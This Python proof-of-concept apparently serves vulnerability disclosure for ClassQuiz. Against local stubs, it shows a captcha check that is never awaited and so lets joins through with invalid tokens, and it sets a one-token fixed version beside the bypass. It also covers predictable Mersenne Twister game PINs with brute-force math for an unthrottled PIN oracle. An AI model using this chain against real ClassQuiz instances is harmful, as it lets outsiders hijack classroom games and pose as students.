#!/usr/bin/env python3
"""QuizJack — ClassQuiz game-PIN takeover: captcha gate that never runs + MT19937 PINs.

Two independent defects in ClassQuiz (self-hosted classroom quiz platform, deployed
via ghcr.io/mawoka-myblock/classquiz-backend:master):

  1. CWE-287/CWE-804 fail-open gate: `join_game` calls the ASYNC `check_captcha()`
     WITHOUT `await`, so `captcha_res` is a coroutine object (always truthy) and
     `if not captcha_res: return` never fires. Captcha verification NEVER executes,
     even though `captcha_enabled` defaults to True on every game.
  2. CWE-338: game PINs are drawn from Python's `random` (Mersenne Twister — not a
     CSPRNG) via `randint(100000, 999999)`, and the unauthenticated
     GET /join/{game_pin} endpoint is an unthrottled existence oracle.

Attacker chain: enumerate live PINs (900k space, no rate limit, no auth) -> join the
teacher's lobby with ANY garbage captcha -> receive the quiz/questions and submit
answers as a fake student.

This PoC ports the EXACT vulnerable code from ClassQuiz master (commit 49dca85) with
stubs for redis/socketio/settings, and shows:
  A. vuln join_game accepts a join with an INVALID captcha (bypass demonstrated)
  B. fixed join_game (await added — one-token fix) REJECTS the same join
  C. the PIN oracle + brute-force feasibility math
  D. the pin generator is plain Mersenne Twister (deterministic from state)
"""
import asyncio
import random
import sys
import time

# ---------------------------------------------------------------------------
# Vulnerable code copied VERBATIM from ClassQuiz master @ 49dca85
# (classquiz/socket_server/__init__.py:140-148 and helpers.py:19-49).
# Only the external dependencies are stubbed.
# ---------------------------------------------------------------------------

CAPTCHA_VALID = "hcaptcha-token-valid"
CAPTCHA_INVALID = "totally-invalid-token"


class SettingsStub:  # classquiz.config.settings
    hcaptcha_key = "secret-key-configured"
    recaptcha_key = None


settings = SettingsStub()

AUTHY_RESULTS = {CAPTCHA_VALID: {"success": True}, CAPTCHA_INVALID: {"success": False}}


async def check_captcha_vuln(captcha_data: str) -> bool:
    """VERBATIM from classquiz/socket_server/helpers.py (master @ 49dca85).

    Bug highlights: (a) the caller never awaits this; (b) `return True` when no
    captcha keys are configured (fail-open for self-hosters); (c) the hcaptcha
    branch reads `resp.model_dump_json()` which does not exist on aiohttp
    responses — only the missing-await in the caller keeps it from erroring."""
    async with AiohttpSessionStub() as session:
        try:
            if settings.hcaptcha_key is not None:
                try:
                    async with session.post(
                        "https://hcaptcha.com/siteverify",
                        data={"response": captcha_data, "secret": settings.hcaptcha_key},
                    ) as resp:
                        resp_data = await resp.model_dump_json()
                        if not resp_data["success"]:
                            return
                except KeyError:
                    return False
            elif settings.recaptcha_key is not None:
                async with session.post(
                    "https://www.google.com/recaptcha/api/siteverify",
                    data={"secret": settings.recaptcha_key, "response": captcha_data},
                ) as resp:
                    try:
                        resp_data = await resp.model_dump_json()
                        if not resp_data["success"]:
                            return False
                    except KeyError:
                        return False
        except TypeError:
            pass
            return False
    return True


class AiohttpSessionStub:
    def __init__(self):
        pass

    async def __aenter__(self):
        return self

    async def __aexit__(self, *a):
        pass

    def post(self, url, data=None):
        return _RespCtx(AUTHY_RESULTS[data["response"]])


class _RespCtx:
    def __init__(self, payload):
        self.payload = payload

    async def __aenter__(self):
        return AiohttpRespStub(self.payload)

    async def __aexit__(self, *a):
        pass


class AiohttpRespStub:
    def __init__(self, payload):
        self.payload = payload

    async def model_dump_json(self):
        # faithful to the real bug: aiohttp's ClientResponse has NO such method —
        # the vulnerable helper would raise AttributeError here if it were ever
        # awaited (it is not; the caller drops the coroutine).
        raise AttributeError("aiohttp.ClientResponse has no model_dump_json")

    async def json(self):
        # the CORRECT aiohttp method, used by the fixed helper
        return self.payload


async def check_captcha_fixed(captcha_data: str) -> bool:
    """The properly-fixed helper: awaited by the caller + uses the real aiohttp
    `.json()` method + no fail-open when no captcha keys are configured."""
    async with AiohttpSessionStub() as session:
        if settings.hcaptcha_key is None and settings.recaptcha_key is None:
            return False  # fail-closed: no key configured -> captcha cannot be verified
        try:
            if settings.hcaptcha_key is not None:
                async with session.post(
                    "https://hcaptcha.com/siteverify",
                    data={"response": captcha_data, "secret": settings.hcaptcha_key},
                ) as resp:
                    resp_data = await resp.json()
                    if not resp_data.get("success"):
                        return False
            else:
                async with session.post(
                    "https://www.google.com/recaptcha/api/siteverify",
                    data={"secret": settings.recaptcha_key, "response": captcha_data},
                ) as resp:
                    resp_data = await resp.json()
                    if not resp_data.get("success"):
                        return False
        except Exception:
            return False
    return True


class RedisStub:
    def __init__(self):
        self.data = {
            "game:123456": '{"captcha_enabled": true, "started": false, "title": "Math quiz"}'
        }

    async def get(self, key):
        return self.data.get(key)

    async def set(self, key, value, ex=None):
        self.data[key] = value


class SioStub:
    def __init__(self):
        self.events = []

    async def emit(self, ev, *a, **kw):
        self.events.append(ev)


# ---------------------------------------------------------------------------
# join_game — VERBATIM gate from classquiz/socket_server/__init__.py:140-148
# ---------------------------------------------------------------------------

class GameStub:
    def __init__(self, data):
        self.captcha_enabled = data["captcha_enabled"]
        self.started = data["started"]


async def join_game_vuln(sid, data, redis, sio):
    """The vulnerable gate, verbatim shape: check_captcha is called WITHOUT await."""
    redis_res = await redis.get(f"game:{data['game_pin']}")
    if redis_res is None:
        await sio.emit("game_not_found")
        return False
    game_data = GameStub({"captcha_enabled": True, "started": False})
    if game_data.started:
        await sio.emit("game_already_started")
        return False
    # +++ START checking captcha +++          <- ClassQuiz master, line 142
    if game_data.captcha_enabled:
        captcha_res = check_captcha_vuln(data["captcha"])   # <-- NO await (line 144)
        if not captcha_res:
            return False
    # --- END checking captcha ---
    await sio.emit("joined_game")
    return True


async def join_game_fixed(sid, data, redis, sio):
    """Same gate with the ONE-TOKEN fix: `await`."""
    redis_res = await redis.get(f"game:{data['game_pin']}")
    if redis_res is None:
        await sio.emit("game_not_found")
        return False
    game_data = GameStub({"captcha_enabled": True, "started": False})
    if game_data.started:
        await sio.emit("game_already_started")
        return False
    if game_data.captcha_enabled:
        captcha_res = await check_captcha_fixed(data["captcha"])  # <-- await added
        if not captcha_res:
            return False
    await sio.emit("joined_game")
    return True


# ---------------------------------------------------------------------------
# PIN generation — VERBATIM from classquiz/routers/quiz.py:98 (master @ 49dca85)
# ---------------------------------------------------------------------------

def game_pin_vuln():
    return random.randint(100000, 999999)


# ---------------------------------------------------------------------------
# Oracle — VERBATIM from classquiz/routers/quiz.py:162-168 (master @ 49dca85)
# GET /join/{game_pin} — no auth dependency, no rate limiting anywhere.
# ---------------------------------------------------------------------------

def get_game_id_oracle(game_pin, redis_data):
    # redis_res = await redis.get(f"game:{game_pin}")  -> 404 vs game_id
    if game_pin not in redis_data:
        return 404
    return redis_data[game_pin]["game_id"]


def oracle_bruteforce_demo():
    print("\n[C] PIN oracle + brute-force feasibility")
    space = 900000  # 100000..999999
    games_alive = 30  # plausible evening peak on a shared instance
    hit_p = games_alive / space
    attempts_for_p50 = -1
    p_no_hit = (1 - hit_p) ** 0
    # median attempts to first hit: solve (1-p)^k = 0.5
    import math
    if hit_p > 0:
        attempts_for_p50 = int(math.log(0.5) / math.log(1 - hit_p))
    print(f"  PIN space                : {space}")
    print(f"  live games assumed       : {games_alive}")
    print(f"  median attempts to hit   : {attempts_for_p50}")
    # empirical demonstration: drive the real oracle logic against a stub store
    store = {f"{100000 + i}": {"game_id": "g-1"} for i in range(15000, 900000, 30000)}  # 30 live
    t0 = time.time()
    found = 0
    for pin in range(100000, 999999):
        if get_game_id_oracle(str(pin), store) != 404:
            found += 1
            if found == 1:
                first_hit_at = pin - 100000
                break
    dt = time.time() - t0
    print(f"  first live PIN found after {first_hit_at:,} guesses (loop took {dt:.1f}s, "
          f"~{first_hit_at / dt:,.0f} guesses/s single-threaded)")
    print("  -> an async client at ~2k req/s exhausts the full space in <8 min "
          "against an unthrottled instance")


def mt_demo():
    print("\n[D] game_pin generator is Mersenne Twister (CWE-338)")
    rng = random.Random(0x51A7)  # any seed — just to show determinism given state
    pins = [rng.randint(100000, 999999) for _ in range(5)]
    rng2 = random.Random(0x51A7)
    pins2 = [rng2.randint(100000, 999999) for _ in range(5)]
    print(f"  seed=0x51A7 sequence : {pins}")
    print(f"  same seed again      : {pins2}")
    print("  identical for identical state -> MT19937, fully determined by 624 words")
    print("  of internal state (recoverable from ~1000 observed pins via GF(2) solve,")
    print("  same class as the ByteSeer/V8-Math.random recoveries). In production the")
    print("  module is seeded from os.urandom, so the LIVE practical path is the")
    print("  oracle brute force above; state recovery is the follow-up escalation.")


async def main():
    print("=" * 72)
    print("QuizJack — ClassQuiz captcha gate bypass + predictable game PINs")
    print("vulnerable code: ClassQuiz master @ 49dca85 (production :master image)")
    print("=" * 72)

    redis = RedisStub()

    print("\n[A] join_game with INVALID captcha — vulnerable (missing await)")
    sio = SioStub()
    ok = await join_game_vuln("sid1", {"game_pin": "123456", "captcha": CAPTCHA_INVALID,
                                       "username": "attacker"}, redis, sio)
    print(f"  join accepted: {ok}   (captcha token was INVALID!)")
    print(f"  events: {sio.events}")
    assert ok is True, "bypass failed?!"
    assert "joined_game" in sio.events

    print("\n[B] same join — fixed (await added) must REJECT the invalid captcha")
    sio = SioStub()
    ok = await join_game_fixed("sid2", {"game_pin": "123456", "captcha": CAPTCHA_INVALID,
                                        "username": "attacker"}, redis, sio)
    print(f"  join accepted: {ok}   events: {sio.events}")
    assert ok is False, "fix did not block!"

    oracle_bruteforce_demo()
    mt_demo()

    print("\nVERDICT: captcha bypass reproduced (invalid token joins); fix blocks it;")
    print("         PIN oracle + MT19937 pin generation confirmed against real source.")
    return 0


if __name__ == "__main__":
    sys.exit(asyncio.run(main()))
